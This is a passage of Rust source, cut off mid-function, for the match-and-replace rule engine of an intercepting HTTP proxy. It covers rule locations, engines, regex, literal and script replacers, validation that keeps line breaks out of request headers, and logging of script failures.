//! Match-and-replace rules. A rule names a place in a message (its location, and for a header
//! or query parameter a name), what to match there (a regex, literal text, or the whole value),
//! and what to write instead. It applies to the traffic of the engines it lists (the proxy
//! unless it says otherwise) and, with a host condition, only to targets whose host matches.
//!
//! Rules live in the project's settings ([`RULES_KEY`]). The proxy reloads them as they change;
//! `send`, the fuzzer and the active scanner read them when a run starts ([`RuleSet::load`]).
//! Nothing here opens a connection: [`RuleSet::request`] and [`RuleSet::response`] only rewrite
//! bytes, which is also all `rules test` does.
//!
//! A rule's replacement is text, or what a script makes of each match ([`ReplaceKind::Script`]:
//! a hook script, run in the sandbox of [`crate::hooks`]). A script that fails (it throws, runs
//! past its time limit, gives something that isn't a replacement, or its file changed) leaves
//! what its rule would have rewritten as it is, and the failure is said: on stderr, and in
//! [`Ruled::failed`] for whoever applied the rules.
//!
//! A request rule ([`RuleLocation::Request`]) is a script alone: its `request(req, ctx)` sees
//! the request as the rules before it left it and says what to do with it. Nothing (or null)
//! sends it as it is; `{ request }` sends it rewritten; `{ block: "reason" }` and `{ response }`
//! stop it: nothing is sent, no connection is opened, and the engine either says it was
//! blocked or takes the script's response as if the server had sent it ([`Ruled::stopped`]).
//! Such a response says so in a header of its own ([`ANSWER_HEADER`]), which the script can't
//! write or remove, and its history row says so in `edited_by` ([`Outcome::Answered`]). A
//! script that fails sends the request as it was, as any failing replacer leaves its message.

use std::cell::{Cell, RefCell};
use std::sync::Arc;

use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;

use regex::bytes::Regex as BytesRegex;
use regex::Regex;
use rusqlite::OptionalExtension;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::capture::decode_body_fully;
use crate::error::{Error, Result};
use crate::hooks::{with_bytes, Hook, HookKind, ScriptRef};
use crate::http::client::SendOptions;
use crate::http::request::split_head_body;
use crate::http::response::dechunk;
use crate::http::{parse_response_head, RawRequest, Target};
use crate::provenance::{Edit, Outcome};
use crate::store::Store;

pub const RULES_KEY: &str = "rules";
/// The meta key of the last match-and-replace rule id handed out: an id is never used twice,
/// so the `edited_by` of an old history row can't come to name another rule.
pub const RULE_IDS: &str = "rule_ids";

/// The place in a message a rule works on.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum RuleLocation {
    /// The request line as one string.
    RequestLine,
    /// Each request header line (`Name: value`), or with a name the value of that header.
    RequestHeader,
    RequestBody,
    /// Each response header line, or with a name the value of that header.
    ResponseHeader,
    ResponseBody,
    /// The request method.
    Method,
    /// The request target's path (without the query string).
    Path,
    /// The value of the query parameter the rule names, as written in the request line.
    QueryParam,
    /// The response's status code.
    Status,
    /// The payload of a WebSocket data message the proxy relays.
    WsMessage,
    /// The whole request, given to a script's `request(req, ctx)`, which may rewrite it, block
    /// it, or answer it itself so that nothing is sent.
    Request,
}

impl RuleLocation {
    pub const ALL: &'static [&'static str] = &[
        "request-line",
        "request-header",
        "request-body",
        "response-header",
        "response-body",
        "method",
        "path",
        "query-param",
        "status",
        "ws-message",
        "request",
    ];

    pub fn parse(s: &str) -> Result<Self> {
        serde_json::from_value(serde_json::Value::String(s.to_string()))
            .map_err(|_| Error::InvalidInput(format!("unknown rule location {s:?}; valid: {}", Self::ALL.join(", "))))
    }

    pub fn name(self) -> &'static str {
        Self::ALL[self as usize]
    }

    fn is_request(self) -> bool {
        matches!(
            self,
            Self::RequestLine
                | Self::RequestHeader
                | Self::RequestBody
                | Self::Method
                | Self::Path
                | Self::QueryParam
                | Self::Request
        )
    }

    fn is_response(self) -> bool {
        matches!(self, Self::ResponseHeader | Self::ResponseBody | Self::Status)
    }

    /// In the request's head, where a line break would start another header.
    fn request_head(self) -> bool {
        self.is_request() && !matches!(self, Self::RequestBody | Self::Request)
    }

    fn is_header(self) -> bool {
        matches!(self, Self::RequestHeader | Self::ResponseHeader)
    }
}

/// Whose traffic a rule applies to.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum Engine {
    /// Requests and responses the proxy relays.
    Proxy,
    /// `send` (the app's Replay), a race included.
    Send,
    /// Fuzz runs.
    Fuzz,
    /// Active scans and declarative checks.
    Scan,
    /// WebSocket messages the proxy relays from the client.
    WsToServer,
    /// WebSocket messages the proxy relays from the server.
    WsToClient,
}

impl Engine {
    pub const ALL: &'static [&'static str] = &["proxy", "send", "fuzz", "scan", "ws-to-server", "ws-to-client"];

    pub fn parse(s: &str) -> Result<Self> {
        serde_json::from_value(serde_json::Value::String(s.trim().to_string()))
            .map_err(|_| Error::InvalidInput(format!("unknown engine {s:?}; valid: {}", Self::ALL.join(", "))))
    }

    pub fn name(self) -> &'static str {
        Self::ALL[self as usize]
    }

    pub fn is_ws(self) -> bool {
        matches!(self, Self::WsToServer | Self::WsToClient)
    }
}

/// How a rule's `pattern` is read.
#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum MatchKind {
    /// A regex; the replacement may use `$1`-style group references.
    #[default]
    Regex,
    /// Plain text; each occurrence is replaced with the replacement as written.
    Literal,
    /// The whole value, when it equals the pattern, is replaced with the replacement as written.
    Whole,
}

impl MatchKind {
    pub const ALL: &'static [&'static str] = &["regex", "literal", "whole"];

    pub fn parse(s: &str) -> Result<Self> {
        serde_json::from_value(serde_json::Value::String(s.to_string()))
            .map_err(|_| Error::InvalidInput(format!("unknown match kind {s:?}; valid: {}", Self::ALL.join(", "))))
    }

    fn is_regex(&self) -> bool {
        *self == Self::Regex
    }
}

/// What a rule does to the header or query parameter it names.
#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum RuleAction {
    /// Rewrite its value where the pattern matches; with no pattern, set the value, adding the
    /// header or parameter if the message has none.
    #[default]
    Set,
    /// Add another one, whatever the message holds.
    Add,
    /// Remove it (with a pattern: only where the value matches).
    Remove,
}

impl RuleAction {
    pub const ALL: &'static [&'static str] = &["set", "add", "remove"];

    pub fn parse(s: &str) -> Result<Self> {
        serde_json::from_value(serde_json::Value::String(s.to_string()))
            .map_err(|_| Error::InvalidInput(format!("unknown rule action {s:?}; valid: {}", Self::ALL.join(", "))))
    }
}

/// What makes a rule's replacement: a variant here, a field of its own on [`Rule`] if it needs
/// more than `replace`, and an arm in [`Replacer`].
#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ReplaceKind {
    /// `replace` as text (with a regex, `$1`-style group references).
    #[default]
    Text,
    /// What the rule's `script` returns for each match: its `replace(match, ctx)` function.
    Script,
}

impl ReplaceKind {
    fn is_text(&self) -> bool {
        *self == Self::Text
    }
}

/// A match-and-replace rule. `pattern` is read as `matcher` says (a regex unless it says
/// otherwise); `replace` may use `$1`-style group references with a regex.
///
/// Without a `name`, a header location matches each header line on its own; an empty pattern
/// adds `replace` as a new header, and a line replaced with nothing is removed. With a `name`
/// (a header's, or a query parameter's) the rule works on that header's or parameter's value
/// and does what `action` says. Elsewhere an empty pattern stands for the whole value, except
/// with a regex on the request line or a body, where it matches nothing (as it always did).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Rule {
    pub id: u32,
    pub location: RuleLocation,
    pub pattern: String,
    #[serde(default)]
    pub replace: String,
    #[serde(default = "yes")]
    pub enabled: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub comment: Option<String>,
    /// Who added it or last enabled it: gui, cli or mcp (None: before brainproxy kept it). A
    /// request it changes records this in its history row's `edited_by`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub origin: Option<String>,
    /// Added (or last enabled) with `--host-header-test`: a Host it puts in a request is meant,
    /// so it is sent even when an agent added the rule.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub host_header_test: bool,
    /// How `pattern` is read.
    #[serde(default, skip_serializing_if = "MatchKind::is_regex")]
    pub matcher: MatchKind,
    /// The header or query parameter the rule works on.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// What to do with the named header or parameter (set, unless it says otherwise).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub action: Option<RuleAction>,
    /// The engines whose traffic it applies to. Empty: the proxy (for `ws-message`, messages
    /// both ways), as every rule did before a rule could say.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub applies_to: Vec<Engine>,
    /// Regex on the target's host (case-insensitive): the rule applies only where it matches.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    /// What makes the replacement.
    #[serde(default, skip_serializing_if = "ReplaceKind::is_text")]
    pub replacer: ReplaceKind,
    /// The script that makes it, for [`ReplaceKind::Script`]: a file, pinned by the hash of its
    /// text when the rule was added.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script: Option<ScriptRef>,
}

fn yes() -> bool {
    true
}

impl Rule {
    /// An enabled regex rule for the proxy, as `rules add --location --match --replace` makes.
    pub fn new(id: u32, location: RuleLocation, pattern: &str, replace: &str) -> Self {
        Rule {
            id,
            location,
            pattern: pattern.into(),
            replace: replace.into(),
            enabled: true,
            comment: None,
            origin: None,
            host_header_test: false,
            matcher: MatchKind::Regex,
            name: None,
            action: None,
            applies_to: Vec::new(),
            host: None,
            replacer: ReplaceKind::Text,
            script: None,
        }
    }

    /// The engines it applies to: the ones it lists, else its location's default.
    pub fn engines(&self) -> Vec<Engine> {
        match (self.applies_to.is_empty(), self.location) {
            (false, _) => self.applies_to.clone(),
            (true, RuleLocation::WsMessage) => vec![Engine::WsToServer, Engine::WsToClient],
            (true, _) => vec![Engine::Proxy],
        }
    }
}

/// What a rule's pattern matches in the value its location picks.
#[derive(Debug, Clone)]
enum Matcher {
    /// The whole value, whatever it is.
    Any,
    Regex(BytesRegex),
    /// Each occurrence of a text (the regex is that text, escaped).
    Literal(BytesRegex),
    /// The whole value, when it is exactly this.
    Whole(Vec<u8>),
}

/// The matches of one value a script is called for at once, and what it may be told of them.
const MAX_MATCHES: usize = 10_000;
const MAX_MATCHED: usize = 8 << 20;

/// One match, as a replacer sees it.
struct Matched<'a> {
    /// The bytes matched.
    found: &'a [u8],
    /// The regex's groups, for a regex match.
    groups: Option<&'a regex::bytes::Captures<'a>>,
}

impl Matched<'_> {
    /// The match as a script's `replace` gets it: its text (and exact bytes when they aren't
    /// UTF-8), and for a regex its groups, by number and by name.
    fn item(&self, names: Option<&BytesRegex>) -> Value {
        let mut item = with_bytes(json!({}), "text", "base64", self.found);
        if let Some(groups) = self.groups {
            let text =
                |m: Option<regex::bytes::Match<'_>>| m.map(|m| String::from_utf8_lossy(m.as_bytes()).into_owned());
            item["groups"] = (0..groups.len()).map(|i| json!(text(groups.get(i)))).collect();
            let named: serde_json::Map<String, Value> = names
                .into_iter()
                .flat_map(|re| re.capture_names().flatten())
                .map(|name| (name.to_string(), json!(text(groups.name(name)))))
                .collect();
            item["named"] = Value::Object(named);
        }
        item
    }
}

/// What a rule writes in place of a match: see [`ReplaceKind`].
#[derive(Debug, Clone)]
enum Replacer {
    Text(String),
    Script(Hook),
}

impl Replacer {
    /// The rule's replacer; the error says why its script can't run now.
    fn of(rule: &Rule) -> std::result::Result<Self, String> {
        match rule.replacer {
            ReplaceKind::Text => Ok(Self::Text(rule.replace.clone())),
            ReplaceKind::Script => {
                let script = rule.script.as_ref().ok_or("it names no script")?;
                let kind = if rule.location == RuleLocation::Request { HookKind::Request } else { HookKind::Replace };
                Hook::load(kind, script).map(Self::Script)
            }
        }
    }

    /// Appends the text replacement for `m` to `out`.
    fn write_text(text: &str, m: &Matched<'_>, out: &mut Vec<u8>) {
        match m.groups {
            Some(groups) => groups.expand(text.as_bytes(), out),
            None => out.extend_from_slice(text.as_bytes()),
        }
    }
}

/// One application of an engine's rules to a message: what a script replacer is told about
/// where its matches are, and where its failures go.
struct Run<'a> {
    engine: Engine,
    host: &'a str,
    failed: RefCell<Vec<Failed>>,
    /// Whether a script's failure is said on stderr: not for a made-up request a rule is tried
    /// on before it is saved.
    quiet: bool,
}

impl<'a> Run<'a> {
    fn new(engine: Engine, host: &'a str) -> Self {
        Run { engine, host, failed: RefCell::default(), quiet: false }
    }

    /// Whether `rule` has anything to do in this message. A rule with a text replacement
    /// always has its turn. One whose replacement a script makes is first applied dry, by
    /// `turn`, to copies: nothing is replaced, and it only shows whether the script would be
    /// called. A script is told the whole message, which costs a copy of it (and for a response
    /// its decoding), so that is made only for a message the rule matches something in.
    fn wants(&self, rule: &CompiledRule, turn: impl FnOnce(&Cx<'_>)) -> bool {
        // A rule that removes writes nothing, whatever its replacer: no script is called.
        if !matches!(rule.replacer, Replacer::Script(_)) || rule.action == RuleAction::Remove {
            return true;
        }
        let dry = Cx { run: self, message: None, dry: true, wanted: Cell::new(false), failed: Cell::new(false) };
        turn(&dry);
        dry.wanted.get()
    }

    /// The context for `rule`'s turn. `message` is the message as it is now, read only for a
    /// rule whose replacement a script makes.
    fn cx(&self, rule: &CompiledRule, message: impl FnOnce() -> Value) -> Cx<'_> {
        let message = matches!(rule.replacer, Replacer::Script(_)).then(|| {
            let mut cx = message();
            cx["location"] = json!(rule.location.name());
            cx["name"] = json!(rule.name);
            cx["engine"] = json!(self.engine.name());
            cx["host"] = json!(self.host);
            cx
        });
        Cx { run: self, message, dry: false, wanted: Cell::new(false), failed: Cell::new(false) }
    }

    fn failed(self) -> Vec<Failed> {
        self.failed.into_inner()
    }

    /// Notes that `rule`'s script failed on this message: said on stderr (unless quiet) and
    /// kept for whoever applied the rules.
    fn note_failure(&self, rule: &CompiledRule, what: &str, error: &str) {
        if let (Replacer::Script(hook), false) = (&rule.replacer, self.quiet) {
            hook.warn(&format!("match-and-replace rule {} {what}", rule.id), error);
        }
        let mut failed = self.failed.borrow_mut();
        if !failed.iter().any(|f| f.id == rule.id) {
            failed.push(Failed { id: rule.id, error: error.to_string() });
        }
    }
}

/// A rule's turn at a message.
struct Cx<'a> {
    run: &'a Run<'a>,
    /// What a script is told: None for a rule with a text replacement.
    message: Option<Value>,
    /// A dry turn (see [`Run::wants`]): a script isn't called, only noted as wanted.
    dry: bool,
    wanted: Cell<bool>,
    /// Whether the rule's script failed in this turn: then none of the turn's changes stay.
    failed: Cell<bool>,
}

impl Cx<'_> {
    /// Notes that `rule`'s script failed here, so the message stays as it is for that rule.
    fn fail(&self, rule: &CompiledRule, error: &str) {
        self.failed.set(true);
        self.run.note_failure(rule, "left a message as it was", error);
    }
}

impl Matcher {
    fn matches(&self, value: &[u8]) -> bool {
        match self {
            Self::Any => true,
            Self::Regex(re) | Self::Literal(re) => re.is_match(value),
            Self::Whole(whole) => value == whole.as_slice(),
        }
    }

    /// `value` with each match replaced by `text`; None when nothing matched.
    fn rewrite_text(&self, text: &str, value: &[u8]) -> Option<Vec<u8>> {
        let mut out = Vec::new();
        match self {
            Self::Any => Replacer::write_text(text, &Matched { found: value, groups: None }, &mut out),
            Self::Whole(whole) => {
                if value != whole.as_slice() {
                    return None;
                }
                Replacer::write_text(text, &Matched { found: value, groups: None }, &mut out);
            }
            Self::Regex(re) | Self::Literal(re) => {
                let expand = matches!(self, Self::Regex(_));
                let mut last = 0;
                let mut any = false;
                for groups in re.captures_iter(value) {
                    let m = groups.get(0).expect("group 0 is the match");
                    any = true;
                    out.extend_from_slice(&value[last..m.start()]);
                    Replacer::write_text(
                        text,
                        &Matched { found: m.as_bytes(), groups: expand.then_some(&groups) },
                        &mut out,
                    );
                    last = m.end();
                }
                if !any {
                    return None;
                }
                out.extend_from_slice(&value[last..]);
            }
        }
        Some(out)
    }
}

#[derive(Debug, Clone)]
pub struct CompiledRule {
    pub id: u32,
    pub origin: Option<String>,
    /// See [`Rule::host_header_test`].
    pub host_header_test: bool,
    location: RuleLocation,
    name: Option<String>,
    action: RuleAction,
    /// None: nothing to match (a header rule then adds a line; others do nothing).
    matcher: Option<Matcher>,
    replacer: Replacer,
    host: Option<Regex>,
    engines: Vec<Engine>,
}

impl CompiledRule {
    fn applies(&self, engine: Engine, host: &str) -> bool {
        self.engines.contains(&engine) && self.host.as_ref().is_none_or(|re| re.is_match(host))
    }

    /// `value` rewritten, or None when the rule doesn't match it, or its script failed (which
    /// `cx` then knows).
    fn rewrite(&self, value: &[u8], cx: &Cx<'_>) -> Option<Vec<u8>> {
        let matcher = self.matcher.as_ref()?;
        let hook = match &self.replacer {
            Replacer::Text(text) => return matcher.rewrite_text(text, value),
            Replacer::Script(hook) => hook,
        };
        // Dry, the only question is whether the script would be called: whether anything matches.
        if cx.dry {
            cx.wanted.set(cx.wanted.get() || matcher.matches(value));
            return None;
        }
        // Every match of the value goes to the script in one call.
        match matcher {
            Matcher::Any => {
                let item = Matched { found: value, groups: None }.item(None);
                self.scripted(hook, vec![item], cx)?.pop()?
            }
            Matcher::Whole(whole) => {
                if value != whole.as_slice() {
                    return None;
                }
                let item = Matched { found: value, groups: None }.item(None);
                self.scripted(hook, vec![item], cx)?.pop()?
            }
            Matcher::Regex(re) | Matcher::Literal(re) => {
                let expand = matches!(matcher, Matcher::Regex(_));
                // Where each match is, and what the script is told of it. A pattern can match at
                // every byte of a body a target sent: what is gathered for the script is
                // counted as it is gathered, not after.
                let (mut spans, mut items, mut size) = (Vec::new(), Vec::new(), 0);
                for groups in re.captures_iter(value) {
                    let m = groups.get(0).expect("group 0 is the match");
                    let told: usize = if expand { groups.iter().flatten().map(|g| g.len()).sum() } else { m.len() };
                    size += 64 + 3 * (m.len() + told);
                    if spans.len() == MAX_MATCHES || size > MAX_MATCHED {
                        cx.fail(
                            self,
                            &format!(
                                "its rule matches in too many places in one value (over {MAX_MATCHES}, or {} MiB \
                                 of them): match less, or the whole value",
                                MAX_MATCHED >> 20
                            ),
                        );
                        return None;
                    }
                    spans.push(m.range());
                    let matched = Matched { found: m.as_bytes(), groups: expand.then_some(&groups) };
                    items.push(matched.item(expand.then_some(re)));
                }
                if spans.is_empty() {
                    return None;
                }
                let replacements = self.scripted(hook, items, cx)?;
                let mut out = Vec::new();
                let mut last = 0;
                for (span, new) in spans.into_iter().zip(replacements) {
                    out.extend_from_slice(&value[last..span.start]);
                    // None: the script leaves this match as it found it.
                    out.extend_from_slice(new.as_deref().unwrap_or(&value[span.clone()]));
                    last = span.end;
                }
                out.extend_from_slice(&value[last..]);
                Some(out)
            }
        }
    }

    /// What the rule's script makes of the matches it is told of in `items`, one replacement
    /// each (None: leave the match as it is). None when it failed, which `cx` then knows:
    /// nothing is replaced.
    fn scripted(&self, hook: &Hook, items: Vec<Value>, cx: &Cx<'_>) -> Option<Vec<Option<Vec<u8>>>> {
        if cx.dry {
            cx.wanted.set(true);
            return None;
        }
        let replacements = match hook.replace(cx.message.as_ref().unwrap_or(&Value::Null), &items) {
            Ok(replacements) => replacements,
            Err(e) => {
                cx.fail(self, e.text());
                return None;
            }
        };
        // A text replacement is checked for this when the rule is saved ([`breaks_head`]); a
        // script's can only be checked now.
        let breaks = |new: &Option<Vec<u8>>| new.as_ref().is_some_and(|new| new.iter().any(|b| b"\r\n\0".contains(b)));
        if self.location.request_head() && replacements.iter().any(breaks) {
            cx.fail(self, "it returned a line break or NUL, which a request's line and headers can't hold");
            return None;
        }
        Some(replacements)
    }

    /// As [`CompiledRule::rewrite`], for a part of the head.
    fn rewrite_str(&self, value: &str, cx: &Cx<'_>) -> Option<String> {
        self.rewrite(value.as_bytes(), cx).map(|b| String::from_utf8_lossy(&b).into_owned())
    }

    /// The value of a header or parameter the rule adds, where there is nothing to match.
    /// None when its script failed, or says to leave things as they are.
    fn fresh(&self, cx: &Cx<'_>) -> Option<String> {
        match &self.replacer {
            Replacer::Text(text) => Some(text.clone()),
            Replacer::Script(hook) => {
                let new = self.scripted(hook, vec![Matched { found: b"", groups: None }.item(None)], cx)?.pop()??;
                Some(String::from_utf8_lossy(&new).into_owned())
            }
        }
    }

    fn matches(&self, value: &str) -> bool {
        self.matcher.as_ref().is_some_and(|m| m.matches(value.as_bytes()))
    }

    fn sets_any(&self) -> bool {
        matches!(self.matcher, Some(Matcher::Any))
    }
}

/// Characters of a header name (RFC 9110 token).
fn is_token(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|b| b.is_ascii_alphanumeric() || b"!#$%&'*+-.^_`|~".contains(&b))
}

/// Checks a rule whether or not it is enabled: a bad one saved disabled would stop the proxy
/// loading any settings once enabled.
pub fn validate_rule(rule: &Rule) -> Result<()> {
    let bad = |m: String| Err(Error::InvalidInput(m));
    let loc = rule.location;
    if loc == RuleLocation::Request {
        if rule.replacer != ReplaceKind::Script {
            return bad("a request rule is a script: name its file with --script".into());
        }
        if !rule.pattern.is_empty() || rule.matcher != MatchKind::Regex || rule.name.is_some() || rule.action.is_some() {
            return bad("a request rule's script is given the whole request: it takes no --match, --match-kind, --name or --action".into());
        }
    }
    match (&rule.name, loc) {
        (None, RuleLocation::QueryParam) => return bad("a query-param rule needs the parameter's --name".into()),
        // The name as it reads decoded: it is written encoded where the rule adds the parameter.
        (Some(n), RuleLocation::QueryParam) => {
            if n.is_empty() || n.chars().any(char::is_control) {
                return bad(format!("{n:?} can't be a query parameter's name"));
            }
        }
        (Some(n), l) if l.is_header() => {
            if !is_token(n) {
                return bad(format!("{n:?} can't be a header's name"));
            }
        }
        (Some(_), _) => return bad(format!("--name goes with a header location or query-param, not {}", loc.name())),
        (None, _) => {}
    }
    match (rule.action, rule.name.is_some()) {
        (Some(_), false) => return bad("--action goes with --name (a header's or a query parameter's)".into()),
        (Some(RuleAction::Add), _) if !rule.pattern.is_empty() => {
            return bad("--action add takes no --match: it adds the header or parameter whatever is there".into())
        }
        (Some(RuleAction::Remove), _) if !rule.replace.is_empty() => {
            return bad("--action remove takes no --replace".into())
        }
        _ => {}
    }
    if breaks_head(rule) {
        return bad("a replacement written into a request's line or headers can't hold a line break or NUL".into());
    }
    match (rule.replacer, &rule.script) {
        (ReplaceKind::Text, None) => {}
        (ReplaceKind::Text, Some(_)) => return bad("a rule that names a script has \"replacer\": \"script\"".into()),
        (ReplaceKind::Script, None) => return bad("a script rule names its script file (--script)".into()),
        (ReplaceKind::Script, Some(script)) => {
            if !rule.replace.is_empty() {
                return bad("--script makes the replacement: it takes no --replace".into());
            }
            if rule.action == Some(RuleAction::Remove) {
                return bad("--action remove takes no --script: nothing is written".into());
            }
            if script.sha256.len() != 64 || !script.sha256.bytes().all(|b| b.is_ascii_hexdigit()) {
                return bad("a script is pinned by its sha256".into());
            }
            // Every engine reads it from wherever it runs: a relative path would name a
            // different file for each.
            if !script.file.is_absolute() {
                return bad(format!("a script file is named by its full path, not {:?}", script.file));
            }
            // The file as it is now must be the one that was pinned.
            script.read().map_err(Error::InvalidInput)?;
        }
    }
    if loc == RuleLocation::Status {
        // A group reference is only known once it has matched, and a script's result once it
        // has run; the result is checked then too.
        let computed =
            rule.replacer == ReplaceKind::Script || (rule.matcher == MatchKind::Regex && rule.replace.contains('$'));
        if !computed && status_parts(&rule.replace).is_none() {
            return bad(format!(
                "a status replacement is a code from 200 to 999, with a reason if you like (\"404\" or \"404 Not Found\"), not {:?}",
                rule.replace
            ));
        }
    }
    let ws = loc == RuleLocation::WsMessage;
    if let Some(e) = rule.applies_to.iter().find(|e| e.is_ws() != ws) {
        return bad(if ws {
            format!("a ws-message rule applies to ws-to-server and ws-to-client, not {}", e.name())
        } else {
            format!("{} takes a ws-message rule: a {} rule applies to proxy, send, fuzz and scan", e.name(), loc.name())
        });
    }
    compile_rules(std::slice::from_ref(&Rule { enabled: true, ..rule.clone() })).map(|_| ())
}

/// Whether `rule` would write a line break or NUL into a request's head, which would start
/// another header (a Host, say). Saving one is refused; one saved before that was checked is
/// skipped when rules load (see [`compile_rules`]) and listed as skipped.
pub fn breaks_head(rule: &Rule) -> bool {
    let breaks = |s: &str| s.contains(['\r', '\n', '\0']);
    rule.location.request_head() && (breaks(&rule.replace) || rule.name.as_deref().is_some_and(breaks))
}

/// Why `rule`'s script can't run now (its file is gone, or changed since the rule was added),
/// for a rule whose replacement a script makes. Such a rule is left out when rules load.
pub fn script_problem(rule: &Rule) -> Option<String> {
    match rule.replacer {
        ReplaceKind::Text => None,
        ReplaceKind::Script => Replacer::of(rule).err(),
    }
}

/// Starts `rule`'s script, if it has one, to say now what its first match would: that it
/// throws as it loads, or defines no `replace` function. This runs the script's top level.
pub fn verify_script(rule: &Rule) -> Result<()> {
    match Replacer::of(rule).map_err(Error::InvalidInput)? {
        Replacer::Text(_) => Ok(()),
        Replacer::Script(hook) => {
            hook.verify().map_err(|e| Error::InvalidInput(format!("script {}: {e}", hook.name())))
        }
    }
}

/// `r` compiled; None when its script can't run now, which is said.
fn compile(r: &Rule) -> Result<Option<CompiledRule>> {
    let replacer = match Replacer::of(r) {
        Ok(replacer) => replacer,
        Err(why) => {
            eprintln!("brainproxy: match-and-replace rule {} not applied: {why}", r.id);
            return Ok(None);
        }
    };
    let bad = |e: regex::Error| Error::InvalidInput(format!("rule {} pattern: {e}", r.id));
    let matcher = if r.location == RuleLocation::Request {
        // The script is given the whole request: there is nothing to match.
        None
    } else if r.pattern.is_empty() {
        match (r.location, r.name.is_some(), r.matcher) {
            // Adds a header line.
            (RuleLocation::RequestHeader | RuleLocation::ResponseHeader, false, _) => None,
            (
                RuleLocation::RequestLine | RuleLocation::RequestBody | RuleLocation::ResponseBody,
                _,
                MatchKind::Regex,
            ) => None,
            _ => Some(Matcher::Any),
        }
    } else {
        Some(match r.matcher {
            MatchKind::Regex => Matcher::Regex(BytesRegex::new(&r.pattern).map_err(bad)?),
            MatchKind::Literal => Matcher::Literal(BytesRegex::new(&regex::escape(&r.pattern)).map_err(bad)?),
            MatchKind::Whole => Matcher::Whole(r.pattern.clone().into_bytes()),
        })
    };
    let host = r
        .host
        .as_deref()
        .filter(|h| !h.is_empty())
        .map(|h| {
            Regex::new(&format!("(?i){h}")).map_err(|e| Error::InvalidInput(format!("rule {} host pattern: {e}", r.id)))
        })
        .transpose()?;
    Ok(Some(CompiledRule {
        id: r.id,
        origin: r.origin.clone(),
        host_header_test: r.host_header_test,
        location: r.location,
        name: r.name.clone().filter(|_| r.location.is_header() || r.location == RuleLocation::QueryParam),
        action: r.action.unwrap_or_default(),
        matcher,
        replacer,
        host,
        engines: r.engines(),
    }))
}

/// The enabled rules, compiled. One that [`breaks_head`], or whose script can't run now
/// ([`script_problem`]), is left out rather than failing the load, so the proxy keeps the rest.
pub fn compile_rules(rules: &[Rule]) -> Result<Vec<CompiledRule>> {
    let compiled: Result<Vec<Option<CompiledRule>>> =
        rules.iter().filter(|r| r.enabled && !breaks_head(r)).map(compile).collect();
    Ok(compiled?.into_iter().flatten().collect())
}

/// A rule that changed a message.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fired {
    pub id: u32,
    pub origin: Option<String>,
    pub host_header_test: bool,
}

/// A rule whose script failed on a message, which that rule then left as it was.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Failed {
    pub id: u32,
    pub error: String,
}

/// The meta key of each rule's last script failure, by rule id: `{"3": {"error": "...", "time":
/// "...", "engine": "proxy"}}`. An engine that leaves a message as it is because a rule's
/// script failed has nowhere of its own to say so (the proxy least of all), so it is noted
/// here for whoever lists the rules.
pub const RULE_FAILURES: &str = "rules.script_failures";

/// Where an engine notes its rules' script failures: the project, or nowhere. It remembers
/// what it last noted for each rule, so one made anew (when an engine starts, and when the
/// proxy loads its rules again after a rule was switched off and on) notes afresh.
#[derive(Debug, Clone, Default)]
pub struct FailureLog {
    project: Option<std::path::PathBuf>,
    /// The failure last written for each rule, and when.
    noted: Arc<std::sync::Mutex<std::collections::HashMap<u32, (String, std::time::Instant)>>>,
}

/// How long a rule's note stands before another failure of the rule replaces it: a script that
/// fails differently on every message costs a write now and then, not one for each.
const NOTE_EVERY: std::time::Duration = std::time::Duration::from_secs(5);

impl FailureLog {
    /// A log in the project `store` is of (an in-memory project has none).
    pub fn of(store: &Store) -> Self {
        Self::at(store.path())
    }

    pub fn at(project: Option<&std::path::Path>) -> Self {
        FailureLog { project: project.map(std::path::Path::to_path_buf), noted: Default::default() }
    }

    /// Notes `failed`, the failures of one message's rules as `engine` applied them: a rule's
    /// first, and after that one that differs from the last noted once that has stood a while.
    pub fn note(&self, engine: Engine, failed: &[Failed]) {
        let Some(project) = self.project.as_deref().filter(|_| !failed.is_empty()) else { return };
        let new: Vec<&Failed> = {
            let noted = self.noted.lock().unwrap_or_else(|e| e.into_inner());
            let due = |f: &&Failed| match noted.get(&f.id) {
                Some((last, when)) => *last != f.error && when.elapsed() >= NOTE_EVERY,
                None => true,
            };
            failed.iter().filter(due).collect()
        };
        if new.is_empty() {
            return;
        }
        // Read and written in one transaction, so two engines noting at once keep both notes.
        let written = crate::hooks::blocking(|| -> Result<()> {
            let mut store = Store::open(project)?;
            let tx = store.write_tx()?;
            let stored: Option<String> =
                tx.query_row("SELECT value FROM meta WHERE key = ?1", [RULE_FAILURES], |r| r.get(0)).optional()?;
            let mut all = stored
                .and_then(|text| serde_json::from_str::<Value>(&text).ok())
                .filter(Value::is_object)
                .unwrap_or_else(|| json!({}));
            let time: String = tx.query_row("SELECT strftime('%Y-%m-%dT%H:%M:%fZ','now')", [], |r| r.get(0))?;
            for f in &new {
                all[f.id.to_string()] = json!({"error": f.error, "time": time, "engine": engine.name()});
            }
            tx.execute(
                "INSERT INTO meta (key, value) VALUES (?1, ?2) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                rusqlite::params![RULE_FAILURES, all.to_string()],
            )?;
            tx.commit()?;
            Ok(())
        });
